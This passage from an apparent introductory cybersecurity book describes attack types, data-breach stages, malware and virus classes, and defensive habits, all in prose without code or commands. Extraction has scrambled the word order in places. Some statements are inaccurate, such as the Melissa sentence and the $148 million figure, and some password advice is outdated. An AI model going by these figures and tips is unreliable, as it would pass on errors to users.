etc.  Some  hackers  or  cybercriminals make  confidential  attacks  their  priority  as  they  aim  to  gather confidential information for their economic, military, and political gain.  2.   Attacks on Availability  Today,  we  see  this  kind  of  attack  in  the  form  of  denial-of- service  and  ransomware  where  victims  are  denied  access  to their  data  when  they  need  it.  A  denial-of-service  flood  the resource  of  a  network  it  unavailable  whereas ransomware encrypts the information of a victim and request for a ransom before it can be decrypted.  to  make          3.   Attacks on Integrity  Also known as a sabotage attack, the purpose of this attack is to damage, corrupt, and destroy the systems or information. This attack would cause a little typographical error. Methods of Cyber-Attacks Cybercriminals employ various means to perform their malicious  activities.  Among these includes:  Social Engineering or Malware  If hackers can see a human being, there won’t be any need to hack into your computer. Socially engineered attacks come in various forms; oftentimes, this is normally through malware. Has your  antivirus  popped  up  an  alert  message  on  your  screen? Have you unknowingly clicked on a malicious attachment? If this is  true,  then  you  have  come  close  to  a  malware  attack. Cybercriminals  target’s  system  using malware  because  of  their  effectiveness.  Malware  is  a  very dangerous  software,  which  includes  ransomware  and  virus. Once it gains access to your system, it causes havoc, ranging from  monitoring  your  online  actions,  controlling  your  machine, and  monitoring  your  keystrokes  to  steal  sensitive  information from  you.  You  will  learn  more  about  malware,  viruses,  and ransomware in later chapters.  invade   their   like   to   Phishing Attacks  The likelihood of you clicking a link in your email or opening an  attachment  is  slim.  However,  there  must  be  a  compelling reason  to  take  such  a  step  considering  the  danger  involved. Cybercriminals are aware of this fact and will do anything within their reach to persuade.   The  best  way  for  anyone  to  steal  your  password  or information is to track you to reveal such information. It doesn’t matter your level of security expertise, anyone can be a victim of a phishing attack. Because of this, most people use a two-factor authentication process to protect their information. If an attacker stills your password, it is as good as unless if he doesn’t know the second-factor key.  What  happens  during  a  phishing  attack  is  that  the  attacker poses as a trusted friend or business partner and sends you an email.  The  email  will  look  authentic  and  have  certain  urgency written  in  it.  The  email  will  contain  a  link  or  attachment  that requires  you  to  open.  Once  you  mistakenly  open  the  email attachment, it installs the malware to your system. Alternatively, if it is a link, it transfers you to a website that looks genuine and requests for login information. Actually, this trap is to lure you to revealing your credentials. In dealing with this kind of situation, you must verify the email and attachments from the sender.  SQL Injection Attack  With  your  little  computer  knowledge,  you  do  know  that  we use  SQL   structured  query  language   to  communicate  with databases.  These  databases  are  essential  for  storing  relevant information.  Most  servers  that  stores  sensitive  information  for websites and services utilize the services of SQL to manage the data.  This  particular  attack  focuses  on  the  SQL  database  and reveals  sensitive.  The  issue  increases  if  such  a  server  stores individual  details  of  the  client  such  as  passwords,  credit  card numbers, etc., which serves as a lucrative and tempting target for attackers. Cybersecurity  Basics  –  Protecting  Your  Computer Network Against Virus and Malware  Spyware,  ransomware,  worms,  viruses,  and  hackers  are  just  a few  things  that  have  the  potential  of  harming  your  network  and computer system. The situation gets worst when you discover how   easy it is for these hackers to steal your information merely through a  malicious  link  in  an  email.  However,  there  are  various  ways  to attack  or  exploit  a  computer.  In  the  same  manner,  we  also  have ways  of  protecting  ourselves  from  these  hackers.  In  this  section,  I will  explore  important  ways  of  protecting  your  computer  network against viruses and malware.    Use   Complex   Passwords   and  Occasionally Change Them One  easy  thing  to  do  to  improve  your  security  is  to  use  a strong  password.  You  should  use  a  strong  password,  which includes  special  characters  in  addition  with numbers and letters. A complex password should be within 8-17 characters  in  length.  Furthermore,  don’t  write  or  store  your passwords  on  your  device  as  this  is  an  easier  means  for hackers  to  steal  your  information.  You  should  change  your password  occasionally,  as  it  will  help  prevent  any  force password  cracks.  The  best  practice  in  protecting  your cybersecurity is to update your passwords once every 3 months.  like  “&*!@”      Install Antivirus  The  first  step  to  protecting  your  computer  network  and  the system  is  to  install  an  antivirus  to  protect  you  against  viruses and  malware.  An  antivirus  can  actively  scan  for  any  virus attempting  to  penetrate  into  your  system  files,  email,  or operating  system.  Importantly,  the  antivirus  you  decide  to  use must run periodic updates. These updates are crucial because every  day  new  viruses  are  created  and  these  updates  are  the key to averting any likely attack.      Install  Anti-Malware  and  Anti-Spyware  Programs Spyware  and  malware  can  cause  severe  damage  to  your computer  network  in  the  same  manner  as  a  virus.  It  is imperative  to  install  anti-spyware  and  anti-malware  programs besides  installed.  You  should occasionally update this software to help remove and quarantine any malware or spyware. What most people do is to install an antivirus  only  and  think  they  will  be  protected  from  any  likely danger.  the  antivirus  you  have   Perform Periodic System Backup  There  are  various  types  of  malicious  agents  such  as ransomware, malware, viruses, worms, etc., which can destroy your files. A good way to safeguard yourself against any attack is to create a periodic backup. For instance, if you consistently back up your computer, you may have something to leverage on if  you  are  attacked  by  a  ransomware.  Remember,  what attackers do when they attack your system with ransomware is to encrypt your data and expects you to pay a ransom to decrypt these  files.  However,  if  you  have  previous  backups,  you  won’t border  paying  such  ransom  because  at  times  there  is  no assurance of the hackers decrypting the file after payment. You can use external drives to backup your data. However, recently we have seen the rise of cloud storage systems.  Install Firewall  A  firewall  is  an  essential  security  tool  you  need  to  protect your network against attack. It serves as a perimeter within your computer  and  blocks  any  unapproved  outgoing  and  incoming access. When you want to configure or set it up, ensure to use            the inbuilt firewall capabilities of your OS. You can update your firewall setting to suit your preference.  Be Careful with Your email  Cybercriminals can take advantage of your emails in various ways. They can attach viruses in your email, which is triggered when  you  open  the  attached  file.  Importantly,  you  should  only read or open emails from people you know. If the email sent to you isn’t recognized, endeavor to delete it immediately.  Be Cautious When Using the Internet  It is significant to know that no website is safe. Irrespective of how safe they may be, there is the possibility of them containing malware  and  spyware.  With  a  single  click  of  the  finger,  your computer  can  become  infected  with  a  virus,  malware,  and spyware.  Since  the  increase  of  cyber  threats,  we  have  seen malicious  websites  camouflaged  as  real  websites.  However, when entering any website, ensure to check the name, spelling, and  make  the  necessary  correction  if  you  discover  anything. Furthermore, avoid clicking graphics, ads, popups, and links to unverified websites.  The  protection  of  your  computer  network  and  the  system begins  with  you  –  the  user.  You  should  take  the  time  to understand  basic  online  security.  You  have  already  taken  the right step by downloading and reading this book. It doesn’t stop here; ensure to put everything you learn in this book into action.  Security Approaches  A  security  approach  from  one  organization  to  another  may be implemented using different models. However, in this book, I   will  summarize  organization uses.  four   important  approaches   that  most  No  security  –  This  model  is  the  simplest  model  to implement  where  the  individual  or  organization  decides  not  to implement any form of security whatsoever. However, intruders can attach the organization in this model.  Security through obscurity – this particular security model has a secured system; nevertheless, no one has knowledge of the  existence  of  any  security  procedure  or  its  content. Unfortunately, this approach isn’t a long-term approach because hackers have ways of knowing about the security structure.  Host Security – in this security model, each system has its own security put in place. It is one of the safest approaches to apply. However, the downside lies in its complexity and diversity in an organization making it harder.  Network  security  –  As  an  organization  tends  to  grow  and become  diverse,  it  is  hard  to  keep  up  with  the  security challenges. However, using a network security model helps the organization  to  stay  focus  on  controlling  access  to  its  network through various hosts. The network security model is one of the efficient and scalable models to implement.   Important Security Management Practices Having  a  good  security  practice  is  paramount.  A  good  security management  practice  will  require  you  to  put  a  security  policy  in place. It is quite easy to implement a security policy because it goes a long way to ensuring a good security management practice. The following are four important aspects of a good security policy.    Legality  –  Does   the  policy  meet  every   legal  requirement?           security?  security?  Cultural issues – does the policy meets with people’s  beliefs, working style, and expectations?  Functionality  –  What  are  the  mechanism  of  rending  Affordability  –  what  is  the  cost  of  implementing  this   Chapter 3: Breaches in  Cybersecurity  investing  heavily   Nowadays,  organizations  are   in  digital infrastructure because of the consequence of cybersecurity attacks and  data  breaches,  which  is  on  the  rise.  According  to  a  recent investigation by the Ponemon Institute, the average cost incurred by data breaches in 2018 alone has increased by 6.4% when compared to the previous years, which amounted to a total of $3.86 million. Do you  know  that  the  average  cost  of  files  stolen  on  the  internet  has increased to $148 million? These figures are on the rise as the day goes by if we do not act by protecting our data.  Giving  the  increasing  costs  and  rising  stakes  of  data  breaches, both  individuals  and  companies  throughout  various  industries  must ensure  they  understand  what  they  are  fighting  against.  This  is absolutely  striking  considering  that  hackers  and cybercriminals  are  taking  advantage  of  the  same  vulnerabilities, which  has  been  the  product  of  previous  mistakes  from  different industries.  Actually,  another  investigation  report  on  “Verizon’s  2018 Data Breach” indicated that since 2014 about 90% of data breaches and 94% of security incidents have fallen into the same categories.  fact   the   This  means  that  organizations  and  individuals  must  learn  new tricks to prevent any form of a data breach while investing in relevant tools to close the cybersecurity gaps, which makes such a situation to happen. Although, this may not mean the same thing for different people, however, what is essential is pinpointing the likely risk you may  face  as  an  individual  within  the  context  of  a  cybersecurity breach.  Furthermore,  not  only  should  you  identify  it,  you  should implement  relevant  solutions,  which  can  safeguard  your  data  and protect your online privacy.   To solve this issue, clear questions must be asked to arrive at the best  solution.  For  instance,  why  are  you  having  data  breaches? What type of data breach do you face frequently? What can you do to avert this situation? Once you begin to proffer solutions to these questions, you are moving closer to a solution that will protect your online presence.  What does Data Security Breach entail? Not everyone can convincingly understand what a data security breach entail. The nature of a security data breach may vary from an individual,  network  architecture  or  organization  size.  Nevertheless, no matter what level, a data breach is simply unauthorized or illegal access to private information. The intention of these cybercriminals and hackers varies; however, one thing we know is their illegitimate nature  in  accessing  data  and  information  that  does  not  belong  to them. Furthermore, it is important to highlight that data breach also including  the  exfiltration  of  information,  which  certain  people  have access to without proper approval from the owners.  How Does a Data Breach Occur? Data  breach  follows  a  particular  pattern,  even  though  we  have various types of data breaches. Later in this chapter, I will expound on these various types of data breaches. Understanding how these cybercriminals successful pull a data security breach will help users and  various  cybersecurity  experts  better  evaluate  any  weaknesses and prepare effectively in order to thwart their schemes.   From the diagram above, it is evident that data breach can take  place in four different stages. These include:    Probe Phase – In this phase, malicious parties start by making  an  effort  to  learn  about  the  network  and  the environment  in  general.  They  start  by  probing  into  your cybersecurity defenses, examine your passwords, analyze how to eventually launch a phishing attack, or find out any outdated  software  that  doesn’t  have  the  recent  security patches.        Initial Attach Phase – Once they are successful in the probing  stage,  they  will  perform  the  first  strike  to  your network. This is mostly through an email, which tries to trick you into clicking a particular website. This will further take you to a malicious website or corrupt an application that will disrupt your workflow.  Expanded Attack Phase – With the initial attack, your system  becomes  vulnerable,  thereby  giving  them  the opportunity  to  evaluate  the  next  action  to  take.  Normally, this may involve taking advantage of anything they can hold   possible in order to strike on the entire network and get as much information they can.  Data  lifting  Phase  –  Due  to  the  different  types  of cybersecurity  breaches  that  may  take  place  at  different timescales,  cybercriminals  may  attempt  to  perform  an exfiltration  on  as  much  data  as  they  can.  Peradventure, they may lay low to understand the amount of data they can steal.  The particular data stolen from one individual or organization by a hacker or cybercriminal varies. Nevertheless, according to the study conducted  by  Verizon,  76%  of  cybersecurity  data  breaches  are financially  motivated.  Alternatively,  this  may  include  trading  of sensitive personal data, government records, proprietary information, or customer information. We have seen recent breaches with Uber, Yahoo, and Facebook, where cybercriminals used these stolen data for their personal gains. Furthermore, the breach of data security cut across various sectors without any exemption to a particular sector.  Types of Data Security Breaches Already, I have explained that we have various caveats when it has  to  do  with  avoiding  both  personal  and  organizational  data breaches. The precise nature of any data attack will be influenced by the individual or organization’s specific vulnerabilities alone with the intention  of  the  attackers.  With  that  clearly  stated,  we  must understand  that  there  are  various  types  of  data  security  breaches, which  include  password  attacks,  ransomware  attack,  malware attack, phishing attack, and human error. However, I will explain the basic  types  of  data  security  breaches  that  we  are  more  prone  to. These include:    Human Error  Sometimes, we are the primary cause of data breach, which I categorize as human error. This is usually not intentionally but accidental as the user isn’t conscious of his or her activity. For   information   instance,  if  you  work  in  an  organization,  the  IT  teams  may carelessly  expose  customer’s  through  server misconfiguration. Additionally, the employee may be a victim of social engineering attacks. The purpose of these attacks may be to  trick  the  individual  in  such  an  organization  to  download apparently safe files or click on malicious links. Another study by CompTIA indicated that half of the data breaches that occur are the  product  of  human  error.  Therefore,  organizations  and individuals  must  be  very  careful  when  clicking  a  link  or downloading a particular file.  Device Loss  A  security  data  breach  may  occur  because  of  device  loss due  to  personal  absentmindedness  or  outright  robbery,  which poses a major security risk. Most times, people are careless and leave their devices such as thumb drives, tablets, laptops, and smartphones,  thereby  leaving  unfettered  access  to  their  data and network. Because they don’t pay attention or are conscious of their device, they give these hackers and cybercriminals the opportunity to steal or intrude on their private data. In whatever situation, these criminal bypasses the security of the device and access the users' information  Cyber Attack  the  world  over  $600  billion,  which   This tends to be more prevalent among the types of security data  breaches  we  have  discussed  so  far.  Today,  cyberattacks cost  is  why  many organizations  are  becoming  concerned  about  the  potential threat it poses. However, individuals and organizations must be on  top  of  their  game  to  avert  these  threats.  Unfortunately, cybercriminals are also not relating as they are using phishing software to penetrate into people’s networks, deploying malware to  infect  their  computer  system,  and  using  ransomware  to defraud individuals and companies after gaining access to their sensitive information.   Internal Data Breaches  At times, an un-accidental data breach can be a real threat. Disgruntled  workers  or  those  who  are  on  the  verge  of  losing their  jobs  may  steal  vital  information  from  their  organization. They  may  access  this  information  and  distribute  them  without any  prior  permission.  However,  an  organization  should  be careful  because  it  may  not  be  an  accidental  breach  from  an employee. How to Prevent Data Security Breach The duty of preventing data security breach doesn’t lie on experts alone as everyone is fully involved. Defending your data from these criminals  is  a  daunting  task.  To  this  end,  it  is  paramount  to  know what  steps  to  take  in  order  to  prevent  any  liable  data  breach. Traditionally, the lifecycle of a data security breach comprises of the following five stages.  In  this  stage,  the  objective  of  security  professionals  is  to work through delicate information with the aim of identifying any vulnerable  data.  Criminals  find  this  sensitive  information  as  an easy target. Your personal information including your password, credit  card  details  are  some  of  the  information  these  criminals look at for, and it is important to take relevant steps to protect it.  Discovery  Detection  After the discovery stage follows the detection stage, where the monitoring of likely security threats can be identified. Without being  vigilant,  you  can  allow  cybercriminals  to  access  your information. For instance, if you have applications that you have not  updated  with  the  recent  security  patches,  you  expose yourself  to  these  attackers  to  exploit  you.  Importantly,  you should review your pending updates regularly.   Prioritization  At this stage, your goal is to prioritize your risks and secure any  loophole  you  may  open  to  your  attacker.  Additionally,  you should  leverage  the  combined  intelligence  of  data  operations and security information to pinpoint where these criminals may likely attack. Furthermore, you should close such gaps to protect your  device.  To  do  to  employ  security professionals to conduct audits to your security network.  this,  you  need      Remediation  The purpose of this stage is to resolve any likely threat you may  have  identified  and  prioritize  during  the  process.  For instance, a remedy may be to install the recent security patches to your outdated software or encrypting sensitive information  Conclusively,  there  is  a  need  to  strategically  and  effectively manage this entire process. Significantly, the process of preventing a security data breach is a continuous process because the threat to a computer network and devices are on the rise.   Security  Data  Breach  Prevention  Tools  The prevention of breaches in cybersecurity is an enormous task for both cybersecurity professionals and the IT team. Besides this, it is  very  challenging  considering  the  impact  and  increase  of  cyber threats  within  the  last  ten  years.  In  the  previous  section,  I  talked about how to prevent a data breach, but that alone isn’t enough to deal  with  there  are  software applications  that  can  help  in  protecting  your  data  from  criminals. These software applications include:  threats.  However,   the  potential   Access Control Software  Today,  we  have  software  applications  that  can  help  to manage  access  rights  while  helping  you  to  delegate  accurate permissions  to  workers  if  you  work  in  an  organization.  These applications  are  not  for  organizations  alone,  but  you  can  set them  to  control  your  basic  security  for  your  devices.  With  this control,  only  authorized  personnel  can  access  the  particular information  you  allow.  In  certain  situations,  these  software applications  can  help  in  auditing  trails  and  generating  reports based on the instruction you set.  Security   Information   and   Event  Management Software   The  primary  purpose  of  these  applications  is  for  log management  and  effective  when  used  in  an  organization.  It helps in collecting, storing, analyzing, and reporting relevant log data. Furthermore, they also supervise real-time security alerts and resolve any potential threats without informing you.  Antivirus  Most  people  neglect  the  importance  of  antivirus.  You  can read more about antivirus in the Chapter on “Computer Viruses.” They can help protect you from various threats while assisting you in pinpointing and removing any potential threats that have infiltrated  your  system.  Antivirus  can  help  protect  you  from ransomware, spyware, adware, worms, Trojans, and any kind of malicious activity. Having a reliable and robust antivirus will help address any threat and give you full visibility of any attack that may occur.  Irrespective  of  the  particular  security  data  breach  tools  you choose  to  implement,  you  should  ensure  its  features  are  robust. Furthermore, your devices require constant updates and patches to fight  against  any  intrusion.  Whatever  software  you  decide  to  use, ensure  it  takes  data  encryption  into  priority.  Today,  there  are  new cyber  threats,  which  are  designed  to  evade  our  current  detection methods.  Because  of  this,  your  security  solution  must  constantly evolve to stay ahead of these security breaches. Finally, if you want to protect your data and online privacy, you must access any likely threat, understanding how these attacks can take place. Once you have identified these threats, you can draw up plans to mitigate them by using relevant security tools.   Chapter 4: Malware – Attack, Types,  and Analysis  Introduction Malware is any software, file, or program that is harmful to your computer  network  or  system.  Malware  is  different  from  the  normal programs in such a way that it can spread or reduplicate itself in your network  or  system  without  you  noticing  while  causing  severe damage. Malware is very powerful and has the potential of creeping the performance of your system while causing grievous destruction to  your  network.  Think  about  a  situation  where  your  computer system is infected and isn’t available for you to use. The data in the system  becomes  unavailable  and  unless  at  that  point.  This  is  the product of a malware attack.  Malware attacks did not originate in this internet age; they have been  in  existence  for  centuries.  However,  over  time  they  have evolved  and  becomes  deadlier  to  their  host.  Below  are  some malware attacks that have taken place in history.    Melissa – In 1999, David L. Smith created and released the  “Melissa”  virus,  which  was  embedded  in  a  Microsoft Word  file.  He  designed  the  file  in  a  way  that  it  contained passwords  for  different  websites,  which  lures  its  victim  to open  the  file.  Once  an  ignorant  victim  opens  the  file,  the macro  is  executed  and  resends  the  virus  to  the  address book  of  the  users.  It  singles  out  the  first  50  people  in  the address  book  to  perpetuate  its  attack.  However,  security experts traced the virus to Smith and he was consequently sentenced to prison to serve 10 years.            My Doom – This particular malware isn’t a virus but a worm, which signifies that it doesn’t need any intervention from any human being to spread to the victim's network. In 2004,  “My  Doom”  was  among  the  fastest  spreading  email worms  in  the  world.  Spammers  were  responsible  for spreading the virus. The name of the malware was derived due to the presence of its name in its code. My Doom was deadly during this year and affected huge companies such as Microsoft and Google. Of course, these companies lost billions in the course of its destruction.  Stuxnet  –  This  malware  was   regarded  as  that  created  a  hardware   the complicated  malware  level destruction of a nuclear plant in Iran. It gains access to the system through a USB drive and infected the systems. The malware uses a code that generates a counterfeited digital certificate, which enables it to evade any form of detection. It  passes  through  the  system’s  network  to  verify  the system’s  control  the  nuclear centrifuges.  finally destroyed it.  line,  which  controls   the  system  and   then  exploited   It   WannaCry  –  Up  to  today,  the  WannaCry  attack  is  the biggest  ransomware  attack  that  has  affected  over  100 countries. The ransomware exploited an SMB vulnerability, which  Microsoft  had  already  pinpointed  and  patched  in March  2017.  The  systems  that  were  running  on  the outdated patches were all affected by this attack. Its mode of  operation  is  virtually  different  from  the  aforementioned attacks. It spreads through the users’ network without their intervention and begins to encrypt the entire system, which makes  it  unusable  for  the  user  unless  they  have  paid  a ransom.  Such  attacks  were  focused  on  the  healthcare industries  before  it  spread  to  other  industries.  Marcus   Hutchins  discovered  a  killing  mechanism;  however,  when the malware was updated, the malware had found another way to bypass that update.  How Does Malware Works Cybercriminals  and  hackers  are  authors  of  malware  with  the intention  of  causing  damage  to  a  network  or  system.  They  use various virtual and physical methods to spread this malware, which infects networks and devices. For instance, malicious programs can be sent to your system through a USB drive. Another means could be via drive-by downloads, which automatically download malicious programs to the victim systems without their knowledge or approval.  Another common attack is phishing attacks, where malicious links or attachments are attached in emails that appear to be legitimate. Once the user opens the link, the malware begins execution without the  knowledge  of  the  individual.  Sometimes,  complicated  malware usually  used  a  command  and  control  server,  which  enables  the attacker  to  connect  with  the  victims’  system  and  exfiltrate  any sensitive  data.  Additionally,  they  can  remotely  control  such  a compromised server or device irrespective of their location.  Evolving  strains  of  malware  involve  obfuscation  and  evasion techniques,  which  are  designed  to  fool  the  users,  anti-malware products,  and  security  administrators.  Most  of  these  techniques depend  on  simple  tracks  like  using  web  proxies  to  source  IP addresses or hide malicious traffic. There are complex threats such as  polymorphic  malware.  This  malware  can  continually  change  its fundamental code to evade any form of detection from the antivirus or signature-based detection tools.  Types of Malware There  are  various   their characteristics  and  traits.  The  following  are  some  of  the  types  of malware:    types  of  malware  depending  on    This is one of the popular types of malware with the ability to execute  and  spread  to  other  files  or  programs.  It  usually requires human involvement to run and spread its operation. We also  have  various  types  of  viruses,  which  include  file  viruses, master boot record viruses, macro viruses, polymorphic viruses, and  stealth  viruses.  You  can  read  more  on  these  in  the  next chapter on “Computer Viruses and Prevention Techniques”  Virus  Trojan  This  particular  malware  is  designed  to  display  itself  as  a legitimate program or file with the intention of gaining access to a system or network. Legitimate software and files are bundled with malware in such a way that once the software is installed in the system, the malware is also installed and begins execution.  Data Sending Trojans  The  job  of  these  Trojans  is  to  steal  sensitive  data  kept  in  your computer and transfer them to the attacker  Remote Access Trojans – This Trojan enables hackers and  cybercriminals  to  remotely  access  your  computer without  the  owner’s  knowledge.  The  attacker  does  this through covert channels.  Security software disabler Trojans – In this case, the Trojan disables the users’ antivirus and firewall system, so that  it successfully without any detention.  they  can  download  malicious   files  and  run                      Destructive  Trojans  –  You  won’t  want  this  kind  of Trojan to access your system because it destroys all your services and files.  This  function  like  a  virus  but  does  not  require  any  human  involvement to run and spread.  Worms  Ransomware  The  primary  function  of  this  malware  is  to  infect  the  user’s system  before  encrypting  the  entire  system.  Once  this  is accomplished,  the  attacker  demands  a  ransom  payment  to rescue  the  document.  There  is  no  assurance  that  once  the ransom is paid, the attacker will decrypt the system.  This is usually packed into attachments and emails. The user is  tricked  into  clicking  on  such  attachment  or  email,  which eventually install a virus on the system  These are hard to detect and impossible to remove. The only  remedy is most likely to format the infected system.  Spam  Rootkits  Spyware  This  malware  acts  as  a  spy  and  sits  on  your  computer.  it  monitors and records the user's activity on the system   They  are  used  to  track  the  download  history  and  browsing activity of the users with the intention of displaying a banner or pop-up  unnecessary advertisements that lure the user into buying something online.  advertisement.   generate   They   Adware  Keyloggers  Also known as system monitors, they record your keystrokes on  the  keyboard.  Through  this,  they  steal  your  information through the keylogger. Detection,  Prevention,  and  Removal  of  A  user  may  detect  the  presence  of  malware  through  various  Malware means. These include:    Automatic reboot and shutdown issues Issues in shutting down Inability to delete some types of files Random shortcut or folders Unresponsive and slow system Unnecessary programs or software running Changes in your system’s default setting Malware attacks  With  these  symptoms,  you  can  detect  when  your  network  or computer  has  been  infected  with  malware.

Most antivirus companies  perform  malware  analysis  to  update  their  signatures  in order to detect and quarantine any malware.  You can now see why updating your antivirus is very important. This particular aspect is for those who are into cybersecurity. One of   the  careers  to  venture  in  cybersecurity  is  malware  analysis. Therefore,  the  following  instruction  is  for  malware  researcher  and analyst because the analysis below can backfire when done wrongly.  The  following  are  two  malware  analysis  techniques  used  by  malware researchers and analysts.    Static Analysis  This  involves  reversing  the  dead  malicious  code  to  understand, and  it  works  while  preparing  a  remedy.  Fortunately,  this  analysis doesn’t can any damage to your system; however, not an easy task to learn and perfect because of the following:    Only a few security professions can understand or code  stuff since the malware is coded  You must identify what the problem is and this requires  experience  It is difficult to get samples of malware     Dynamic Analysis  This  analysis  is  easier  than  the  previous  one;  notwithstanding, very  dangerous  and  not  effective  if  the  malware  has  gotten  to  an advanced stage. The analysis is ineffective because some malware can detect when it is run in an open environment or a lab. It can stop running when they detect any analysis tool.  Furthermore,  if  the  malware  is  timed  to  attack,  it  can  affect  its effectiveness.  The technique requires you to run the malware in a secluded environment in order to pinpoint its behavior. Its behavior can be classified into:     File-system behavior Network behavior System changes Registry changes  In spite of this, the technique is dangerous because     It can cause permanent damage to your system It  can  break  out  from  the  secluded  environment  and  affect your host system  Different  malware  has  a  different  intention  of  attacking  a computer  system.  These  could  include  creating  zombies,  choking your  bandwidth,  infecting  files,  destruction  of  data,  etc.  Therefore, you should understand the various malware types and possible ways of avoiding it. If you are working to become a malware analyst, you should understand how malware works, identify them, and create a relevant signature to identify it. Furthermore, malware attacks have become advanced, but their intention hasn’t changed. Therefore, you should take your security seriously before your sensitive information because  a  medium  through  which  hackers  request  for  ransom. Additionally, ensure your device is protected and avoid the use of an external drive that is not properly vetted through a premium antivirus.   Chapter 5: Computer Virus and  Prevention Techniques  Introduction Today, the idea of you having a computer virus is frightening and poses  a  sense  of  discomfort.  No  one  wants  to  be  in  that  situation where a security expert informs them that their computer has been infected  with  a  virus  with  no  remedy  to  rescue  their  files  and important document.  Computer  viruses  comprise  of  three  different  parts,  which includes the infection mechanism, the trigger, and the payload. Don’t border asking how I came about this. Well, the explanation below will make  sense  to  you.  The  infection  mechanism  deals  with  how  the virus spreads, which is normally by modifying code that contains a copy  of  the  virus.  Actually,  an  infection  vector  is  the  way  a  virus spreads through its medium. Furthermore, some various use multiple ways  of  infecting  files.  The  trigger  part  deals  with  the  choice  of whether to distribute the payload or not. Finally, the payload involves damaging  the  system  accidentally  or  intentionally.  Besides  the infection mechanism, the trigger and payload parts are optional.  A  computer  virus  can  spread  into  your  system  through  the  following means:    Pirated software Visiting an infected website Installing downloading  media  players,   games, and other system utilities  Sharing pictures, files, and music with friends Installing mainstream software applications Connecting infected external storage devices  toolbars,   free   What is a virus? A virus is a program, which attaches itself to the original program code  and  runs  whenever  that  authentic  program  runs  with  the intention  of  causing  harm  without  the  knowledge  of  the  user.  A computer virus normally reproduces itself without your knowledge or permission.  Generally,  they  have  an  infection  stage  where  they regenerate and the attack stage where they cause havoc.  Another definition of a virus will be a program, which reduplicates or replicates its own code by attaching itself to another executable file in a way that the virus code is executed whenever the executable file is executed.  Types of computer virus A computer virus can be grouped into various ways, but in this  book,  I  will  classify  them  based  on  their  orthogonal  axes. This means we will look at viruses based on the type of target they try to infect along with the methods used to hide from been detected  by  anti-virus  and  users.  One  of  the  simple  ways  of categorizing viruses is based on what they try to infect. In this section,  I  will  explore  three  of  these  ways,  which  include executable  file  infectors,  boot-sector  infectors,  and  macro viruses  data file infectors         Boot Sector Infectors  In  as  much  as  the  sequence  of  operation  of  the  boot  virus differs  on  different  machines,  it  follows  a  simple  process.  You power  on  the  system  and  the  ROM-based  instructions  begin operation.  It  then  performs  self-test,  device  detection,  and initialization  test.  Immediately  the  boot  device  is  identified  with the boot block read from the device, then control is sent to the loaded  code.  This  entire  process  is  known  as  the  primary booting  process.  Furthermore,  the  code  loaded  during  this process  loads  another  larger  program,  which  understands  the file system structure of the boot device.   While  viruses  are  becoming  obsolete,  it  doesn’t  mean  that they won’t pop out. The boot sector virus affects mostly floppy disks, which are used in booting a computer. However, modern systems  don’t  use  floppy  disks,  but  these  viruses  can  still appear on the Master Boot Record of the system. They normally take  place  in  the  partitioned  storage  device  of  the  computer. Notwithstanding,  these  threats  are  now  mitigated  since  the evolution of the internet.  Direct Action Virus  This  virus  shocked  the  world  in  1998  and  is  normally triggered  when  the  infected  file  is  executed.  It  is  an  infectious virus,  which  doesn’t  stay  hidden  in  the  computer  memory  or install itself. Instead, the load is sent directly to your computer before the virus becomes active. The only limitation to this virus it is activated only when you implement the infected file.  What the direct action virus does is to attach itself to a COM or EXE files and wait for someone to activate it by clicking on the  file.  Once  the  file  is  executed,  it  pops  into  the  computer system,  looking  for  similar  files  in  your  computer  directory  to spread  the  virus.  Nevertheless,  do  not  be  frightened  because the virus doesn’t delete any file, nor does it affect your computer performance.  Besides  making  some  of  your  files  inaccessible, the impact on the user is minimal and can be removed with a reliable antivirus program.  Resident Virus  This particular virus is a file infector. Unlike the direct action viruses, which don’t install itself, the resident virus installs itself in  the  computer.  Even  when  the  original  source  file  has  been infected  and  eradicated,  the  resident  virus  makes  the  file  to continue work. Most security experts regard the resident virus is more deadly than its cousin the direct action virus does.   Simply,  the  virus  attaches  itself  to  your  computer  memory, affects the file, and leaves the original file behind while running the  virus  on  its  own.  The  painful  part  is  that  they  are  tricky  to spot. Trickier is the fact that removing them isn’t easy. Resident viruses comprise of slow infectors and fast infectors. The slow infectors  are  not  easy  to  distinguish  because  the  symptoms grow  slowly.  On  the  other  hand,  fast  infectors  create  much damage to the system even though they are easier to identify.  More regrettably is that they can cling to anti-virus software and infect every file the antivirus tries to scan. Nevertheless, to remove them, you need to install an operating system patch.  Polymorphic Virus  This particular virus is one of the most hardly detectable or removable  viruses  for  any  antivirus  program.  These  antivirus programs  are  hard  to  protect  you  when  a  polymorphic  virus attacks  your  system  because  the  software  program  has  the capability  of  blacklisting  a  particular  virus  variant.  However,  a polymorphic  virus  changes  its  binary  pattern  whenever  it duplicates.  When  an  antivirus  program  encounters  a polymorphic  virus,  it  sees  it  as  a  different  software  in  the system. This makes it evade the antivirus blacklist.  Multipartite Virus  If you have observed, viruses use two methods to transmit their  version.  This  could  be  through  a  method  or  through  a single payload. However, just like Oliver Twist that always asks for more, the multipartite virus wants it all. This particular virus spread in various ways and infects files and operating system. Furthermore,  the  multipartite  virus  can  simultaneously  affect executable  and  boot  sector  files,  which  allow  them  to  spread quickly and rapidly. This “two-edged” sword-like attack makes it hard  for  anyone  to  remove  the  virus.  It  doesn’t  matter  if  you decide  to  wipe  the  program  files  because  the  virus  remains  in   the  boot  sector.  From  the  boot  sector,  it  reproduces  itself immediately you switch the computer on.  Trojan horse and Worms  Have you heard about the Trojan horse? What do you think they are? Well, a Trojan horse is a computer program that lets the attack of the Trojan horse to control the device of the user from  a  remote  location.  The  Trojan  horse  camouflages  as  a program  that  is  useful  to  the  users,  and  immediately  it  is installed,  it  creates  backdoors,  installs  malicious  payloads, compromises  installs  unwanted programs, etc.  the  user’s   information,   The  following  are  some  activities  that  an  attacker  can  perform  through a Trojan horse.    It  damages  the  user's  computer  by  causing  a  blue  screen of death, crashing the system, etc.  In  the  course  of  performing  distributed  DoS  attacks,  it  uses the individual’s computer as Botnet  Modifying the files of the user’s system Stealing  sensitive  information,  including  credit  card,  stored password, etc.  View the user’s screenshot Log all the keys the user presses on the keyboard and sends  the  information  to  the  attacker.  Through  this,  the attacker harvest the user password, credit card information, and other sensitive information  Perform  electronic  money  theft  through  illegal  money  transfers  Download the user’s browsing data  On  the  other  hand,  a  worm  is  a  malicious  computer  program, through  a  computer  network.  A  which  cybercriminal or hacker may use a worm to perform activities like:    reduplicates   itself    Installing  a  backdoor  to  the  user’s  computer;  the backdoor  can  be  used  in  creating  a  zombie  computer, which  is  used  to  perform  DoS  attack,  spam  emails,  etc. furthermore, this other malware can exploit this backdoor.  Install destructive payload code, 